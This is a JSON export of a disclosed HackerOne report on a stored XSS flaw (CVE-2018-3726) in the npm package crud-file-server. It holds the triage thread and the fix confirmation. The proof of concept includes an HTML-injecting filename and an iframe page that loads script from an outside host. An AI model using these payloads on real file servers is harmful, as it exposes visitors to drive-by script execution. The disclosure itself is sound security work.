@@ -1,0 +1,645 @@
+{
+  "id": 311101,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTExMDE=",
+  "url": "https://hackerone.com/reports/311101",
+  "title": "[crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-31T20:38:25.774Z",
+  "submitted_at": "2018-01-31T20:38:25.774Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3726"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-02-17T17:51:51.597Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-02-17T17:51:41.894Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\n**crud-file-server** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.\n\n## Module\n\n**crud-file-server**\n\nThis package exposes a directory and its children to create, read, update, and delete operations over http.\n\nhttps://www.npmjs.com/package/crud-file-server\n\nversion: 0.7.0\n\nStats\n0 downloads in the last day\n26 downloads in the last week\n220 downloads in the last month\n\n~2500 estimated downloads per year\n\n\n## Description\n\nThis vulnerability exists, because ```name``` which represents filename(s) is output in HTML without any sanitization. This allows to embed malicious code in filenames listed in directory:\n\n```javascript\n// node_modules/crud-file-server/crud-file-server.js, line 137\n    res.setHeader('Content-Type', 'text/html');\t\t\t\t\t\t\t\t\t\t\t\n    res.write('<html><body>');\n    for(var f = 0; f < results.length; f++) {\n        var name = results[f].name;\n        var normalized = url + '/' + name;\n        while(normalized[0] == '/') { normalized = normalized.slice(1, normalized.length); }\n        res.write('\\r\\n<p><a href=\"/' + normalized + '\">' + name + '</a></p>');\n    }\n    res.end('\\r\\n</body></html>');\n```\n## PoC - Steps To Reproduce:\n\n- install ```crud-file-server```\n\n```\n$ npm install crud-file-server\n```\n\n\n- in the directory which will be served via ```crud-file-server```, create file with following name:\n\n```\n\"><iframe src=\"malware_frame.html\">\n```\n\n- create second file with name ```malware_frame.html``` with following content and save it in the same directory:\n\n\n```\n<html>\n\n<head>\n    <meta charset=\"utf8\" />\n    <title>Frame embeded with malware :P</title>\n</head>\n\n<body>\n    <p>iframe element with malicious code</p>\n    <script type=\"text/javascript\" src=\"http://bl4de.tech/poc.js\"></script>\n</body>\n\n</html>\n```\n\nRun ```crud-file-server``` in directory with file with changed filename:\n\n```\n$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080\n\nusage:\n  crud-file-server [options]\n\nthis starts a file server using the specified command-line options\n\noptions:\n\n  -f file system path to expose over http\n  -h log head requests\n  -p port to listen on (example, 80)\n  -q suppress this message\n  -r read only\n  -v virtual path to host the file server on\n\nexample:\n\n  crud-file-server -f c:/ -p 8080 -q -v filez\n\nlistening on :8080/, serving ./\n```\n\nand open ```http://127.0.0.1:8000``` in the browser. You will notice an alert served from bl4de.tech, executed in context of page with directory index:\n\n{F259251}\n\n\n## Supporting Material/References:\n\nConfiguration I've used to find this vulnerability:\n\n- macOS HighSierra 10.13.3\n- node 8.9.3\n- npm 5.5.1\n- curl 7.54.0\n\n## Wrap up\n\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\n\nThank you\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability can be used to eg. download malware via \"drive-by-download\" attacks. Also, as described in other modules I've reported similar vulnerabilty, an iframe with malicious JS file loaded from external resource can be executed.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 259251,
+      "file_name": "1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/259/251/3a01b57e56be5dab7528af74ae74cd3c9bc6a032/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5KGXRBGU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T075504Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJIMEYCIQDiu73PCn5l7l3wlMXq817tsLto7FX5g79UonFNj20jJgIhAPuMVuO5S%2FlWb9Y7jys%2FFmIqLfD455lH6tb3c8te%2BkaWKrIFCCkQAxoMMDEzNjE5Mjc0ODQ5IgyezhDoMIz09gQiiD0qjwVi6M8Iw%2BYchcUo89cd%2FUxbwmI3perpG0vPlDA5e2%2FiLDPg6k8NNfGVbfa98LLEY3SrEG4oS1iJV9UBA4UBpdHDL7MSAwaw54zlG1HPvOpHUTuH9EQ1XWnHt5U64A5mJI3tV9FW83PEajArU2uAhgOXB5JsY45y%2FEa%2BLr788B3HOVgfJAAetE116YdMCcuv03h3Ty4dLFKN7JuFITHP2DFoK%2FTv1%2BWTXdVDmhENMs60DoJcCBNM8p5tVWMy%2FDrXmy8laSpzT1P6dPLd%2F658Evbke%2FxHHPPHoA5yZSvNHWnPCGDtFH48waIv0IS3qo%2FWyGQKkexPozxIr7Bg4%2BGg%2FdaBSVKstyQciV8oAhqQdm1mnuBNk1e2gjlshxJVSSNnTiEBIDLcTrQjaAEcHGe2WTsw4Y0Zq5dPejGtGEAh82ITyFWvj%2FMJ6Qhup5LV0V5HRaGfBKxkp6eWDhC%2FPqwyvKKjzamL7pIyrhJPrs%2Ffsv136WFKldjOyLWdZARWpcM5%2F22aL16ZoPk9JSu88DmP7crL1l1H%2BR1FeAP4SGMiW2FiQcZQVNDd75UtFPVIhUMrafO0zrtk3cSUi1abRyovgpi16dGkXTOCrwgL7UQXJkSspnuOG9NB%2B3sGnJBrB9HtCXxhO9K2FEg6QXsqDI%2FJyyfAYZIX1WvGcuYlt5ThB6ADvHta3uPauAOyXmdaHbmXdvcwS%2BeZpGqTAbjpLckaWZYNc9ZPXIqadLa2hl%2FR0CYST%2FvuY9ZdcrOw3lUHCx2ZxW%2B0i3yZHzBNfnJ0TkTxnbSRue4Bz7XtuDDV1wQUwMok%2BScMiNvbVVmgZg18zI8uc4BDF1NJSK31O54xKtQfRY3ovaNOZVUjeohMO%2FW8sTVwMLStuqgGOrABlX%2BoKKtD0OvX0tUoWppcBBx%2BVWFGu3swUjlDtOmRr5iw9d9x30GSnk6a0UYsc42MAdcAkhhXMvYQ9ZC%2Frgy2Rog4LYc706Aor8HSqEZZj2j85x7VqdBzK6oZ6aZZixoiaYBZXHruuiuTubSyME8bT9iYkP632lu0G6dDXBzqnZwwZ54GwWzMSKmEidSNaewLPuu6Q%2FfaZ6rI5mpn5t7gT0iJ0FId6JybKFedx2eqln0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=26e76c8dddffc485de66dc3bdbdacf2a674f36ae5978f5d6b26b68c5f8dfcf98",
+      "file_size": 412920,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-03-19T17:51:41.992Z",
+  "allow_singular_disclosure_after": -173973802.3442192,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "jokebookservice1",
+    "eveeez",
+    "khaledibnalwalid",
+    "japz"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5800,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "crud-file-server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 2340387,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @bl4de \n\nThanks a lot for reporting this to us.\nA member of the team will look at your report and triage it shortly!\n",
+      "automated_response": false,
+      "created_at": "2018-01-31T22:03:26.653Z",
+      "updated_at": "2018-01-31T22:03:26.653Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2344938,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @bl4de,\n\nThanks for reporting this issue to us.\n\nI was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue. \n",
+      "automated_response": false,
+      "created_at": "2018-02-02T12:07:13.410Z",
+      "updated_at": "2018-02-02T12:07:13.410Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2344940,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-02T12:07:30.224Z",
+      "updated_at": "2018-02-02T12:07:30.224Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2344961,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-02T12:13:33.115Z",
+      "updated_at": "2018-02-02T12:13:33.115Z",
+      "additional_data": {
+        "old_severity": "Medium",
+        "new_severity": "Critical (9.6)",
+        "old_severity_id": 114071,
+        "new_severity_id": 114583
+      },
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2361061,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ChangedScope",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-08T03:37:55.128Z",
+      "updated_at": "2018-02-08T03:37:55.128Z",
+      "actor": {
+        "username": "reed",
+        "cleared": false,
+        "verified": false,
+        "url": "/reed",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "old_scope": "Other module",
+      "new_scope": "crud-file-server",
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2361063,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-08T03:38:27.420Z",
+      "updated_at": "2018-02-08T03:38:27.420Z",
+      "cve_ids": [
+        "CVE-2018-3726"
+      ],
+      "actor": {
+        "username": "reed",
+        "cleared": false,
+        "verified": false,
+        "url": "/reed",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2384090,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Since the author didn't join the report I opened a security issue in the repo.",
+      "automated_response": false,
+      "created_at": "2018-02-14T20:56:39.928Z",
+      "updated_at": "2018-02-14T20:56:39.928Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2386557,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-15T13:40:42.198Z",
+      "updated_at": "2018-02-15T13:40:42.198Z",
+      "actor": {
+        "username": "omphalos",
+        "cleared": false,
+        "verified": false,
+        "url": "/omphalos",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2386567,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@bl4de you mentioned there is another issue related to crud-file-server - I'm not sure how to find it on this site.  Can you point me to it please?",
+      "automated_response": false,
+      "created_at": "2018-02-15T13:44:10.097Z",
+      "updated_at": "2018-02-15T13:44:10.097Z",
+      "actor": {
+        "username": "omphalos",
+        "cleared": false,
+        "verified": false,
+        "url": "/omphalos",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2386590,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@omphalos \n\nSure, that's this report:\n\nhttps://hackerone.com/reports/310690\n\nBut I believe to be able to see one, some of triage team has to invite you to join it (I can't do this as reporter).",
+      "automated_response": false,
+      "created_at": "2018-02-15T13:54:57.909Z",
+      "updated_at": "2018-02-15T13:54:57.909Z",
+      "actor": {
+        "username": "bl4de",
+        "cleared": false,
+        "verified": false,
+        "url": "/bl4de",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2386617,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks @bl4de!\n\n@lirantal if there is a remaining issue with crud-file-server I will be happy to help with it.\n",
+      "automated_response": false,
+      "created_at": "2018-02-15T14:07:56.783Z",
+      "updated_at": "2018-02-15T14:07:56.783Z",
+      "actor": {
+        "username": "omphalos",
+        "cleared": false,
+        "verified": false,
+        "url": "/omphalos",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2387519,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@omphalos thanks for jumping in!\nI invited you to the other issue as well where you will collaborate on it with my colleague @vdeturckheim.\nGoodluck and thank you for your pro-active attitude!\n\nWith regards to this issue, is there a fix added already that @bl4de can verify?",
+      "automated_response": false,
+      "created_at": "2018-02-15T18:57:26.462Z",
+      "updated_at": "2018-02-15T18:57:26.462Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2388406,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@lirantal, @bl4de stated he verified the fix for this issue in the github thread.",
+      "automated_response": false,
+      "created_at": "2018-02-16T00:25:20.345Z",
+      "updated_at": "2018-02-16T00:33:09.126Z",
+      "actor": {
+        "username": "omphalos",
+        "cleared": false,
+        "verified": false,
+        "url": "/omphalos",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2388425,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@lirantal - I can confirm issue is fixed and not reproducible anymore.\n\n@omphalos - thanks for quick fixes, I am happy I was able to help :)",
+      "automated_response": false,
+      "created_at": "2018-02-16T00:43:45.587Z",
+      "updated_at": "2018-02-16T00:43:45.587Z",
+      "actor": {
+        "username": "bl4de",
+        "cleared": false,
+        "verified": false,
+        "url": "/bl4de",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2390172,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Oh great, awesome work!\n\nAre you guys ok if I go ahead and fully public disclose the report now?",
+      "automated_response": false,
+      "created_at": "2018-02-16T09:47:15.905Z",
+      "updated_at": "2018-02-16T09:47:15.905Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2390238,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@lirantal Yep, I'm fine, as always :)",
+      "automated_response": false,
+      "created_at": "2018-02-16T10:28:53.274Z",
+      "updated_at": "2018-02-16T10:28:53.274Z",
+      "actor": {
+        "username": "bl4de",
+        "cleared": false,
+        "verified": false,
+        "url": "/bl4de",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2390716,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@omphalos ?",
+      "automated_response": false,
+      "created_at": "2018-02-16T14:21:31.010Z",
+      "updated_at": "2018-02-16T14:21:31.010Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2392251,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@lirantal yes that would be great, thank you.",
+      "automated_response": false,
+      "created_at": "2018-02-16T23:50:30.580Z",
+      "updated_at": "2018-02-16T23:50:30.580Z",
+      "actor": {
+        "username": "omphalos",
+        "cleared": false,
+        "verified": false,
+        "url": "/omphalos",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2395025,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-17T17:51:31.528Z",
+      "updated_at": "2018-02-17T17:51:31.528Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "bl4de",
+        "url": "/bl4de"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2395026,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-17T17:51:41.948Z",
+      "updated_at": "2018-02-17T17:51:41.948Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2395027,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ManuallyDisclosed",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-17T17:51:51.519Z",
+      "updated_at": "2018-02-17T17:51:51.519Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
